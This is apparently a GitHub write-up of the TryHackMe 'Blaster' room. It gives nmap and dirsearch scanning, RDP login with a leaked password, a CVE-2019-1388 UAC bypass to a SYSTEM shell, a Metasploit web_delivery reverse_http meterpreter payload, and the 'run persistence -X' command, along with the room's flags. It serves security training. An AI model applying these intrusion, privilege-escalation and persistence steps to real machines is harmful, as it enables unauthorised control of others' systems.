![Blaster Background](https://i.imgur.com/MbNgkRQ.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Blaster_Cover.png" alt="Blaster Logo">
</p>

# Blaster

This guide contains the answer and steps necessary to get to them for the [Blaster](https://tryhackme.com/room/blaster) room.

## Table of contents

- [Activate Forward Scanners and Launch Proton Torpedoes](#activate-forward-scanners-and-launch-proton-torpedoes)
- [Breaching the Control Room](#breaching-the-control-room)
- [Adoption into the Collective](#adoption-into-the-collective)

### Activate Forward Scanners and Launch Proton Torpedoes

In this task we will gather information about our target machine to log in to it.

1. How many ports are open on our target system?

   We use the following nmap command to scan the system:
   
   ```cmd
   sudo nmap 10.10.133.12 -Pn -sS -sV
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Scanning_Nmap_Scan.png)

   ><details><summary>Click for answer</summary>2</details>

2. Looks like there's a web server running, what is the title of the page we discover when browsing to it?

   We find a server running on port 80. We can navigate to this URL in our browser to find the webpage.
   
   ![Webpage](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Scanning_Webpage.png)

   ><details><summary>Click for answer</summary>IIS Windows Server</details>

3. Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

   Using the following command, we can find any hidden directories:
   
   ```cmd
   dirsearch -u 10.10.133.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
   ```
   
   ![Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Scanning_Directory.png)

   ><details><summary>Click for answer</summary>/retro</details>

4. Navigate to our discovered hidden directory, what potential username do we discover?

   Browsing through some of the pages we see one name recuring several times.
   
   ![Webpage Username](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Scanning_Username.png)

   ><details><summary>Click for answer</summary>Wade</details>

5. Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

   On one of the blog entries we see him talking about difficulties logging in. Then in a comment, he mentions his password.
   
   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Scanning_Password.png)

   ><details><summary>Click for answer</summary>Parzival</details>

6. Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

   Using Reminna we can remotely log into the machine and find the flag and the desktop.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Scanning_Flag.png)

   ><details><summary>Click for answer</summary>THM{HACK_PLAYER_ONE}</details>

### Breaching the Control Room

In this task we will escalate our priveleges using a UAC exploit.

1. When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

   

   ><details><summary>Click for answer</summary>CVE-2019-1388</details>

2. Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

   

   ><details><summary>Click for answer</summary>hhupd</details>

*Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!*



This question was a though one, as there was no possibility for me to find out where to go next without a guide. The hint mentioned we should look for what the user was searching for. So the first thing I did was opening Internet Explorer to find any browser hidtory. This was empty.. Looking at other people's writeups, I saw they also had Chrome installed. I, unfortunately, didn't.
   
I took the liberty of viewing the users browser history another user [posted](https://muirlandoracle.co.uk/2020/01/06/tryhackme-christmas-2019-challenge-write-up/#Day_Thirteen_-_Accumulate). Apparently, they were searching for a CVE. Perhaps the system is vulnerable to it.
   
After another Google [search](https://github.com/nobodyatall648/CVE-2019-1388) I learned we could exploit the vulnerability to obtain a cmd shell with elevated priveleges through the UAC window.
   
I this case we can open the `.exe` file on the desktop to open a UAC prompt and view the certificate.
   
![View Certificate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Breach_Root_Certificate.png)
   
   Clicking on the link for the certificate issuer should spawn a browser instance with elevated priveleges as it originates from the `.exe`.
   
   **Important note!** `Make sure no browser window is currently open before visiting the link. Otherwise, the link will be opened in the browser instance without priveleges.`
   
In the opened browser window we get a connection error, but we can ignore that. We need to save this page as. Either through the menu or with `Ctrl + S`. 
   
![Save as Prompt](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Breach_Save_Page.png)
   
In the path bar we write: `C:\Windows\System32\cmd.exe` and press Enter.
   
4. Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

   A cmd shell should openen with elevated priveleges. Lets check.
   
   ![Cmd Window](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Breach_Elevated_Shell.png)
   
   ><details><summary>Click for answer</summary>nt authority\system</details>

5. Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

   Now we can navigate to the Administrator folder and read the flag.

   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Breach_Root_Flag.png) 

   ><details><summary>Click for answer</summary>THM{COIN_OPERATED_EXPLOITATION}</details>

### Adoption into the Collective

In this task we will use MetaSploit to enable a remote shell and increase our presistance.

*Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.*

Type the following command to use the specified module (or you can search for it):

```cmd
use exploit/multi/script/web_delivery

search exploit delivery
```

2. First, let's set the target to PSH (PowerShell). Which target number is PSH?

   Type `show targets` or `info` to find which target we must use.
   
   ![Targetse](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Targets.png)

   ><details><summary>Click for answer</summary>2</details>

*After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.*

First we must view the options and then we can set the correct options.

![Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Options.png)

![Set Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Set_Options.png)

**Note:** The `SRVHOST` and `SRVPORT` do not have to be changed. `LHOST` needs to be our attack machine.

*Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.*

We need to set the correct payload with:

```cmd
set payload payload/windows/meterpreter/reverse_http
```

![Set Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Set_Payload.png)

Now we can run the exploit as a background job with `run -j`.

![Run Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Run_Exploit.png)

*Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.*

Copy the entire command we are presented with and paste it into the terminal we previously spawned on our target machine. Then we should see a reverse shell appear in our meterpreter session.

![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Reverse_Shell.png)

6. Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 

   On this website https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/ we can find more information on persistence in a meterpreter session. Unfortunately, the script was not found on my machine.
   
   ![Script Not Found](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blaster/Adoption_Script_Not_Found.png)

   ><details><summary>Click for answer</summary>run persistence -X</details>

*Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!*
